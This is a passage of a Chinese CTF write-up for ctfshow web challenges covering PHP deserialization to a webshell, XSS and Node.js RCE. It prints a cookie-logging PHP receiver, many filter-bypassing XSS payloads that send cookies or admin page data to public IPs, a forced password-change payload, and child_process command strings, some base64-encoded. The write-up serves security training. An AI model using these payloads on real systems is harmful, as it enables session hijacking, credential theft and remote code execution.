&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>逻辑：终点有两个,但是我们没有看见可以触发invoke的标准函数()括号，排除，于是思路是用<code>file_put_contents</code>写webshell。</p>
<p>在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。这里code会等于username+password，要求弱等于0x36d，也就是十进制的877，那么只需要把username等于877.php就行了。</p>
<h4 id="PHP-的弱类型比较"><a href="#PHP-的弱类型比较" class="headerlink" title="PHP 的弱类型比较"></a>PHP 的弱类型比较</h4><p><code>==</code> 在 PHP 中是<strong>弱类型比较</strong>（loose comparison）：</p>
<ul>
<li>当左右两边类型不一致时，PHP 会尽量把它们转换成相同类型再比较。</li>
<li>如果是“数字字符串” 和 “数字” 比较，PHP 会把字符串按数字规则转换成整数，然后比较。</li>
</ul>
<p>数字转换规则：</p>
<ul>
<li>从字符串开头开始读取，如果是数字就转换成数字，遇到第一个非数字字符就停止。</li>
</ul>
<p>​&#96;&#96;&#96;php<br><?php
class ctfshowvip{
    public $username = '877.php';
    public $password = '<?php eval($_GET[a])?>‘;<br>    public $code &#x3D; 877;<br>    public function __invoke(){<br>        eval($this-&gt;code);<br>    }</p>
<pre><code>public function __destruct()&#123;
    if($this-&gt;code==0x36d)&#123;
        file_put_contents($this-&gt;username, $this-&gt;password);
    &#125;
&#125;
</code></pre>
<p>}</p>
<p>$a &#x3D; new ctfshowvip();<br>echo serialize($a);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">之后访问/877.php，通过webshell执行RCE。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### web262</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## XSS</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/Jayjay___/article/details/133375048</span><br><span class="line"></span><br><span class="line">### web316</span><br><span class="line"></span><br><span class="line">![image.png](https://cdn.nlark.com/yuque/0/2025/png/55662681/1756979424360-256e23f4-97d7-4ba4-881d-aba45b3aca33.png?x-oss-process=image%2Fformat%2Cwebp)</span><br><span class="line"></span><br><span class="line">在自己vps上写</span><br><span class="line"></span><br><span class="line">```php+HTML</span><br><span class="line">&lt;?php</span><br><span class="line">        $cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">        $time = date(&#x27;Y-m-d h:i:s&#x27;, time());</span><br><span class="line">        $log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);</span><br><span class="line">        fwrite($log,$time.&#x27;:    &#x27;. $cookie . &quot;\n&quot;);</span><br><span class="line">        fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>接着在框里写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/xss.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果之前没有cookie.txt要自己建立一个</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756979530074-d60b7de2-247a-446a-ab78-e0fd334a36dd.png?x-oss-process=image/format,webp" alt="image.png"></p>
<h3 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h3><p>大小写不敏感过滤了script，那就用img标签写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; οnerrοr=location.href=&quot;http://47.122.71.42/xss.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web318-319"><a href="#web318-319" class="headerlink" title="web318.319"></a>web318.319</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=location.href=&quot;http://47.122.71.42/xss.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://47.98.193.145/1111/127.php?1=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://47.98.193.145/1111/127.php?1=&#x27;+document.cookie&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe οnlοad=document.location=&#x27;http://47.98.193.145:1470/?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-321"><a href="#web320-321" class="headerlink" title="web320.321"></a>web320.321</h3><p>过滤了script，img，空格。</p>
<p>空格可以用<code>%09</code>、<code>tab</code>、<code>/</code>、<code>/**/</code>代替。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<p>这里网上看到一个构造payload的复杂方法，主要是利用String.fromCharCode()函数可以ascii码转字符的特性把payload都变成ascii码。</p>
<p>字符串转ascii码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)  <span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">ascii_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">    ascii_code = <span class="built_in">ord</span>(char)  <span class="comment"># 使用ord()函数获取字符的ASCII码</span></span><br><span class="line">    ascii_list.append(<span class="built_in">str</span>(ascii_code))  <span class="comment"># 将ASCII码转换为字符串并添加到列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span></span><br><span class="line">result = <span class="string">&#x27;,&#x27;</span>.join(ascii_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的ASCII码:&quot;</span>, result)</span><br></pre></td></tr></table></figure>



<p>ascii码转字符串脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br></pre></td></tr></table></figure>



<p>这样的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</span><br></pre></td></tr></table></figure>

<p>括号里面是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://120.46.41.173/Jay17/127.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="web322-326"><a href="#web322-326" class="headerlink" title="web322-326"></a>web322-326</h3><p>过滤了script，img,iframe,xss,空格，分号，逗号。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe<span class="comment">/**/</span>οnlοad=location.<span class="property">href</span>=<span class="string">&quot;http://ip/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;svg/**/οnlοad=location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line">&lt;body/οnlοad=location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line">&lt;input/**/οnfοcus=location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<p>322，没复现成功，要么是格式上双引号单引号什么的，忘记chmod 666了</p>
<p>搞出来一个结果是PHPSESSID&#x3D;a6v9u4gg01sg1eh55498q0lh9i; flag&#x3D;you are not admin no flag</p>
<p>很疑惑</p>
<p>还有这题是过滤了xss的所以这里要改名</p>
<p>当将这行脚本代码提交后，稍等片刻，会有个类似admin管理员的程序每隔一段时间就查看我们提交的连接，然后就可以拿到admin的cookie</p>
<p>看了另外一个wp，这个不会死</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://47.122.71.42/poc.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><blockquote>
<p>这题开始是存储型XSS了。首先就是poster必须是admin才能发送成功，其次就是XSS的触发点应该是sender和content都可以。这题没有任何过滤。</p>
<p>payload：（其实这题没有过滤，懒一点直接复制之前的了）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; onload=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>注册时候用户名密码都用payload（头这里没用了，可能被过滤了）</p>
<p>打paylaod前vps监听9023端口。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>获得管理员的cookie</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1757149241016-0a90b84f-d299-404a-9e9b-01c828e4756a.png?x-oss-process=image/format,webp" alt="image.png"></p>
<p>点击用户管理，改cookie</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1757149265381-78905287-f98c-4693-bc84-7bfb7827d9fc.png?x-oss-process=image/format,webp" alt="image.png"></p>
<p>不懂，放在这里以后研究：</p>
<blockquote>
<p>别人的wp：<br>TIP：关于异步(加深了解可写项目或看项目)，页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。</p>
<p>另外一种思路：<br>将页面指定部分直接发送到XSS平台<br>经分析，flag大概率在document.body.innerText，且数据量不大</p>
<p>yu师傅的超强模块也是个好办法：</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c81f856502a1c54aa271b34db25adc27.png" alt="image-20230926223432415"></p>
<h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>和上题一样，但是过滤了script，用<code>&lt;svg οnlοad=&quot;&quot;&gt;</code>标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>还是仅管理员可见。</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e3966a01130c32c077efb2c821824996.png" alt="image-20230926224850950"></p>
<p>和上题不同的是，Cookie会立刻失效。不能通过窃取Cookie的形式得到flag了。</p>
<p>我们分析一下原理，我们的payload作为储存型XSS，管理员访问时候能被我们窃取Cookie，那是不是还能窃取点别的东西呢，比如说管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息。</p>
<p>问题是如何带出数据？</p>
<p>方法一：我们可以通过类名查找元素，通过document来获取。</p>
<p>现在vps上面监听端口9023。</p>
<p>innerHTML和outerHTML的区别</p>
<p>1、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML</p>
<p>2、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。</p>
<p>可以看到前端代码中将要显示admin密码的地方类为layui-table-cell laytable-cell-1-0-1<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4239067b7d7f048781688e46da4be0ec.png" alt="image-20230926230205978"></p>
<p>payload： （作为账号密码注册后登录）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解释一下它的每一部分：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.open(&#x27;http://120.46.41.173:9023/&#x27; + document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML) 这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。</span><br><span class="line">&#x27;http://120.46.41.173:9023/&#x27; 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http://）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 /）。</span><br><span class="line">document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。</span><br><span class="line">document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;) 是一个通过类名查找元素的方法。它查找具有类名 &#x27;layui-table-cell&#x27; 和 &#x27;laytable-cell-1-0-1&#x27; 的元素，通常这是一种针对表格单元格的选择。</span><br><span class="line">[1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。</span><br><span class="line">.innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</span><br></pre></td></tr></table></figure>



<p>还有两种解法，自己去这里看：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">https://blog.csdn.net/Jayjay___/article/details/133375048</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tj13995958709/article/details/137744197">https://blog.csdn.net/tj13995958709/article/details/137744197</a></p>
<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>这一题用上一题的做法就不行，这一题admin的cookie是一直在变的，而且很快，看到此题还有修改密码的功能，注册个普通账号，在修改密码时抓包</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b9e001099149888669046078e78158e2.png" alt="img"></p>
<p>可以利用xss漏洞让admin自己修改密码</p>
<p>可以看见，调用了一个api&#x2F;api&#x2F;change.php?p&#x3D;123。参数p就是我们修改后的密码。Cookie用于验证身份。</p>
<p>我们想修改管理员的密码，一开始肯定会想到先拿管理员Cookie再伪造包。但是管理员Cookie实时变化呀。我们何尝不使管理员”主动”修改密码呢，当然，是在XSS的作用下”主动”修改密码。</p>
<p>payload： （还是老样子，作为账号密码，注册登录）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=1717&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这时候会出现一种情况，我们在管理员账号上一点击<code>用户管理</code>，立马跳转到api，来不及复制flag。这是因为我们的XSSpayload是一个用户账号，管理员每次访问<code>用户管理</code>都会解析它。</p>
<p>解决办法：立刻Ctrl+u查看源码或者抓包。</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/7014bddcae9748ce09744dcb89cb8da6.png" alt="image-20230928045022882"></p>
<p>下面开始乱写了</p>
<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>post发</p>
<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>给admin转负数</p>
<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>自己转自己</p>
<h3 id="总结常见过滤"><a href="#总结常见过滤" class="headerlink" title="总结常见过滤"></a>总结常见过滤</h3><p>script</p>
<p>img</p>
<p>空格</p>
<p>iframe</p>
<p>xss</p>
<p>;</p>
<p>,</p>
<p>题目类型大概分为反射性，存储型（注册登录，管理员cookie）</p>
<h2 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>附件给了源码 user.js login,js</p>
<p>user.js 中有用户名：CTFSHOW，密码：123456 4、审计 login.js，其中代码 return name!&#x3D;&#x3D;’CTFSHOW’ &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;，用户名输入小写 ctfshow</p>
<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>页面发现 eval 参数的 get 传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;tac fl00g.txt&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码解释：</span><br><span class="line">require(&#x27;child_process&#x27;)：在 Node.js 里，child_process 是一个内置模块，require(&#x27;child_process&#x27;) 用于引入该模块，借助它可以创建子进程。</span><br><span class="line">spawnSync(&#x27;ls&#x27;, [&#x27;.&#x27;])：spawnSync 是 child_process 模块的同步方法，其作用是创建一个子进程并执行命令。这里执行的命令是 ls（在 Unix/Linux 系统下用于列出目录内容），参数是 .（表示当前目录）。</span><br><span class="line">.stdout.toString()：spawnSync 方法的返回值包含子进程的标准输出（stdout）等信息，stdout 是一个 Buffer 对象，toString() 方法把它转换为字符串。</span><br><span class="line">整体效果：当 Web 应用执行这个 eval() 代码时，会列出当前目录下的所有文件和文件夹。</span><br></pre></td></tr></table></figure>

<p>跟 SSTI 是固定模版，require 类似于 import，所以背就完事了，</p>
<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>把上一题的 execSync 过滤了</p>
<p>过滤了 exec，其他不变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">child_process.spawnSync(command[, args][, options])</span><br><span class="line"></span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;-l&#x27;, &#x27;.&#x27;]).stdout</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;fl001g.txt&#x27;]).stdout</span><br></pre></td></tr></table></figure>

<p>其中的 stdout 表示缓冲区中的内容，也就是输出结果，也可以在结尾继续追加一个 toString()方法但是还可以用</p>
<p>or:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查发现过滤了 exec</span><br><span class="line">可以将命令 base64 编码，然后解码后再次 eval</span><br><span class="line"></span><br><span class="line">/?eval=eval(Buffer.from(&quot;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp&quot;,&#x27;base64&#x27;).toString(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure>

<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">	res.end(flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);</span><br></pre></td></tr></table></figure>

<p><code>?a[a]=1&amp;b[b]=1</code><br>满足 a 和 b 都为真、a 和 b 长度相等、和字符串拼接的结果都是[object Object]flag</p>
<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">给了源码, 看到 login.<span class="property">js</span> 里面有个 <span class="title function_">copy</span>() 函数</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">找到 <span class="title function_">copy</span>() 函数的用法</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>基础的原型链污染, 因为需要 满足条件 <code>secert.ctfshow===&#39;36dboy&#39; </code>, 可以输出 flag,<br>但是 secert 是否有 ctfshow 不重要, 让它的原型拥有就行,<br>secert 和 user 都是 对象, 在执行 copy 操作 ,构造一个请求体污染了 user 的原型,<br>存在一个 ctfshow 的属性, 值为 36dboy , 那么在 secert 的里面找不到 ctfshow 的属性. 就会往原型上去找, 从而满足<code>secert.ctfshow===&#39;36dboy&#39;</code> ,得到 flag<br>抓个登录的包, 修改一下就行</p>
